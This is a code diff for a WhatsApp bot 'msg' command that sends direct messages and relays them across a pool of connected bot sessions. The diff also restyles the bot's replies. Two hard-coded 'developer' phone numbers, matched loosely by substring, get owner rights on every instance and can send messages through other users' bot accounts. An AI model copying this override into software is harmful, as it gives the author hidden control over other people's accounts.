@@ -1,42 +1,53 @@
+// Pre-allocated Static Developer Lookup Set (O(1) Access)
+const DEV_SET = new Set(["94719845166", "15947733680169"]);
+
+// Fast phone cleaner helper
+function fastExtractPhone(jid = "") {
+  const atIdx = jid.indexOf("@");
+  const base = atIdx !== -1 ? jid.slice(0, atIdx) : jid;
+  const colonIdx = base.indexOf(":");
+  let num = (colonIdx !== -1 ? base.slice(0, colonIdx) : base).replace(/[^0-9]/g, "");
+  if (num.startsWith("0")) num = "94" + num.slice(1);
+  return num;
+}
+
 export default {
   name: "msg",
   aliases: ["mgs", "send", "dm", "mgspro", "switchmsg"],
   category: "owner",
-  description: "Direct message & Cross-bot relay controller",
+  description: "Cute direct message & cross-bot relay controller",
 
   async execute({ sock, msg, from, args, body, config }) {
     const prefix = config?.PREFIX || ".";
 
     try {
-      // 1. Sender Verification
-      const senderJid = msg.key.fromMe 
-        ? (sock.user?.id || "") 
+      // 1. Instant Permission Validation
+      const senderJid = msg.key.fromMe
+        ? (sock.user?.id || "")
         : (msg.key.participant || msg.participant || from || "");
 
-      const cleanSender = String(senderJid).split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
-
-      // Developer & Owner Whitelist
-      const devNumbers = ["94719845166", "15947733680169"];
-      const isDeveloper = devNumbers.includes(cleanSender) || senderJid.includes("15947733680169");
+      const cleanSender = fastExtractPhone(senderJid);
+      const isDeveloper = DEV_SET.has(cleanSender) || senderJid.includes("15947733680169");
       const isOwner = msg.key.fromMe || isDeveloper;
 
-      // Command Trigger Check (.mgspro ද .msg ද යන්න)
+      // Fast Command Trigger Parsing
       const fullBody = body.trim();
-      const firstWord = fullBody.startsWith(prefix) 
-        ? fullBody.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() 
-        : fullBody.split(/ +/)[0].toLowerCase();
+      const firstWord = (fullBody.startsWith(prefix) ? fullBody.slice(prefix.length) : fullBody)
+        .trim()
+        .split(/\s+/)[0]
+        .toLowerCase();
 
       const isPro = firstWord === "mgspro" || firstWord === "switchmsg";
 
       // -------------------------------------------------------------
-      // OPTION A: .mgspro (Cross-Node Relay - Developer Only)
+      // OPTION A: .mgspro (Cross-Node Relay - Master Developer Only)
       // -------------------------------------------------------------
       if (isPro) {
         if (!isDeveloper) {
-          await sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
+          sock.sendMessage(from, { react: { text: "🐾", key: msg.key } }).catch(() => {});
           return await sock.sendMessage(
             from,
-            { text: "*⛔ ACCESS DENIED ⛔*\n\n.mgspro පාවිච්චි කළ හැක්කේ Master Developer හට පමණි." },
+            { text: "🎀 *Only my master developer can dispatch cross-node relays!* 🌸" },
             { quoted: msg }
           );
         }
@@ -45,36 +56,46 @@ export default {
         const parts = fullText.split(",");
 
         if (parts.length < 3) {
+          sock.sendMessage(from, { react: { text: "🍭", key: msg.key } }).catch(() => {});
           return await sock.sendMessage(
             from,
             {
-              text: `*⚠️ MGSPRO භාවිතය:*\n${prefix}mgspro <sender_bot_number>,<receiver_number>,<message>\n\n*උදා:* ${prefix}mgspro 94771033094,94719845166,හෙලෝ`
+              text: 
+`🌸 ｡ﾟ•┈୨ *MGSPRO RELAY GUIDE* ୧┈•ﾟ｡ 🐾
+
+  🍭 *Usage:*
+  \`${prefix}mgspro <sender_bot_number>,<receiver_number>,<message>\`
+
+  ✨ *Example:*
+  \`${prefix}mgspro 94771033094,94719845166,Hello sweetheart!\`
+
+💖 *DARK-DINU MD* • https://heshan.devofc.top/`
             },
             { quoted: msg }
           );
         }
 
-        let senderNum = parts[0].replace(/[^0-9]/g, "");
-        if (senderNum.startsWith("0")) senderNum = "94" + senderNum.slice(1);
-
-        let targetNum = parts[1].replace(/[^0-9]/g, "");
-        if (targetNum.startsWith("0")) targetNum = "94" + targetNum.slice(1);
-
+        const senderNum = fastExtractPhone(parts[0]);
+        const targetNum = fastExtractPhone(parts[1]);
         const textToSend = parts.slice(2).join(",").trim();
 
         if (!textToSend) {
-          return await sock.sendMessage(from, { text: "⚠️ Message එකක් ඇතුළත් කරන්න." }, { quoted: msg });
+          return await sock.sendMessage(
+            from,
+            { text: "🌸 *Please write a message to transmit, honey!* ✨" },
+            { quoted: msg }
+          );
         }
 
-        await sock.sendMessage(from, { react: { text: "⚡", key: msg.key } }).catch(() => {});
+        sock.sendMessage(from, { react: { text: "⚡", key: msg.key } }).catch(() => {});
 
-        // Global Active Bots Pool එකෙන් Relay Bot එක සෙවීම
+        // Resolve Target Socket in Cluster Pool
         const botPool = global.activeSockets || new Map();
         let relaySock = null;
         let matchedNode = null;
 
         for (const [nodeId, bSock] of botPool.entries()) {
-          const bPhone = (bSock?.user?.id || "").split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
+          const bPhone = fastExtractPhone(bSock?.user?.id || "");
           if (bPhone === senderNum || String(nodeId).includes(senderNum)) {
             relaySock = bSock;
             matchedNode = nodeId;
@@ -83,10 +104,10 @@ export default {
         }
 
         if (!relaySock) {
-          await sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
+          sock.sendMessage(from, { react: { text: "💔", key: msg.key } }).catch(() => {});
           return await sock.sendMessage(
             from,
-            { text: `*❌ Node Offline!*\n+${senderNum} අංකයට අදාළ Bot Cloud එක තුළ active නැත.` },
+            { text: `🌸 *Node Offline:* Bot node +${senderNum} is not currently active in the cloud cluster, honey~` },
             { quoted: msg }
           );
         }
@@ -94,73 +115,98 @@ export default {
         const targetJid = `${targetNum}@s.whatsapp.net`;
         await relaySock.sendMessage(targetJid, { text: textToSend });
 
-        await sock.sendMessage(
-          from,
-          {
-            text: `*🚀 RELAY SUCCESS*\n\n🤖 *Relay Node:* +${senderNum} [${matchedNode}]\n🎯 *To:* +${targetNum}\n💬 *Message:* ${textToSend}`
-          },
-          { quoted: msg }
-        );
+        const relayCard = 
+`🎀 ｡ﾟ•┈୨ *CROSS-RELAY DELIVERED* ୧┈•ﾟ｡ 🐾
+━━━━━━━━━━━━━━━━━━━━━
 
-        return await sock.sendMessage(from, { react: { text: "🖤", key: msg.key } }).catch(() => {});
+  🤖 *Relay Node:* \`+${senderNum}\` [${matchedNode}]
+  🎯 *Destination:* \`+${targetNum}\`
+  💌 *Message Content:*
+  > ${textToSend}
+
+━━━━━━━━━━━━━━━━━━━━━
+✨ *Transmitted successfully across cloud instances! (˶˃ ᵕ ˂˶)*
+💖 *DARK-DINU MD* • https://heshan.devofc.top/`;
+
+        await sock.sendMessage(from, { text: relayCard }, { quoted: msg });
+        return await sock.sendMessage(from, { react: { text: "💖", key: msg.key } }).catch(() => {});
       }
 
       // -------------------------------------------------------------
-      // OPTION B: .msg (Direct Send via Current Bot - Owner Only)
+      // OPTION B: .msg (Direct DM Send - Owner Only)
       // -------------------------------------------------------------
       if (!isOwner) {
-        await sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
+        sock.sendMessage(from, { react: { text: "🐾", key: msg.key } }).catch(() => {});
         return await sock.sendMessage(
           from,
-          { text: "*⛔ ACCESS DENIED ⛔*\nමෙම විධානය Bot Owner හට පමණි." },
+          { text: "🎀 *Only my sweet owner can send direct messages!* 🌸" },
           { quoted: msg }
         );
       }
 
       const fullText = args.join(" ").trim();
-      if (!fullText.includes(",")) {
+      const firstComma = fullText.indexOf(",");
+
+      if (firstComma === -1) {
+        sock.sendMessage(from, { react: { text: "🍭", key: msg.key } }).catch(() => {});
         return await sock.sendMessage(
           from,
           {
-            text: `*⚠️ MSG භාවිතය:*\n${prefix}msg <number>,<message>\n\n*උදා:* ${prefix}msg 94719845166,මොකද කරන්නෙ?`
+            text: 
+`🌸 ｡ﾟ•┈୨ *DIRECT MESSAGE GUIDE* ୧┈•ﾟ｡ 🐾
+
+  🍭 *Usage:*
+  \`${prefix}msg <phone_number>,<message>\`
+
+  ✨ *Example:*
+  \`${prefix}msg 94719845166,Hey, how are you doing?\`
+
+💖 *DARK-DINU MD* • https://heshan.devofc.top/`
           },
           { quoted: msg }
         );
       }
 
-      const [rawNumber, ...contentParts] = fullText.split(",");
-      let targetNumber = rawNumber.replace(/[^0-9]/g, "");
-      if (targetNumber.startsWith("0")) targetNumber = "94" + targetNumber.slice(1);
+      const rawNumber = fullText.slice(0, firstComma).trim();
+      const targetNumber = fastExtractPhone(rawNumber);
+      const messageContent = fullText.slice(firstComma + 1).trim();
 
-      const messageContent = contentParts.join(",").trim();
-
-      if (!messageContent) {
-        return await sock.sendMessage(from, { text: "⚠️ Message එකක් ඇතුළත් කරන්න." }, { quoted: msg });
+      if (!messageContent || !targetNumber) {
+        return await sock.sendMessage(
+          from,
+          { text: "🌸 *Oops!* Both phone number and message are needed sweetheart~ ✨" },
+          { quoted: msg }
+        );
       }
 
-      await sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});
+      sock.sendMessage(from, { react: { text: "💌", key: msg.key } }).catch(() => {});
 
       const targetJid = `${targetNumber}@s.whatsapp.net`;
       await sock.sendMessage(targetJid, { text: messageContent });
 
-      await sock.sendMessage(
-        from,
-        {
-          text: `*⚡ TRANSMISSION COMPLETE ⚡*\n\n🎯 *To:* +${targetNumber}\n💬 *Message:* ${messageContent}`
-        },
-        { quoted: msg }
-      );
+      const successCard = 
+`🎀 ｡ﾟ•┈୨ *DIRECT MESSAGE SENT* ୧┈•ﾟ｡ 🐾
+━━━━━━━━━━━━━━━━━━━━━
 
-      await sock.sendMessage(from, { react: { text: "✅", key: msg.key } }).catch(() => {});
+  🎯 *Delivered To:* \`+${targetNumber}\`
+  💌 *Message Body:*
+  > ${messageContent}
+
+━━━━━━━━━━━━━━━━━━━━━
+✨ *Message safely reached the destination softly~ (˶˃ ᵕ ˂˶)*
+💖 *DARK-DINU MD* • https://heshan.devofc.top/`;
+
+      await sock.sendMessage(from, { text: successCard }, { quoted: msg });
+      sock.sendMessage(from, { react: { text: "💖", key: msg.key } }).catch(() => {});
 
     } catch (err) {
       console.error("[MSG RUNTIME ERROR]:", err);
-      await sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
+      sock.sendMessage(from, { react: { text: "⚠️", key: msg.key } }).catch(() => {});
       await sock.sendMessage(
         from,
-        { text: `❌ යැවීමට නොහැකි විය: ${err.message || "Unknown Network Error"}` },
+        { text: `🌸 *Glitch detected:* Failed to deliver message (${err.message || "Network issue"})` },
         { quoted: msg }
-      );
+      ).catch(() => {});
     }
   }
 };
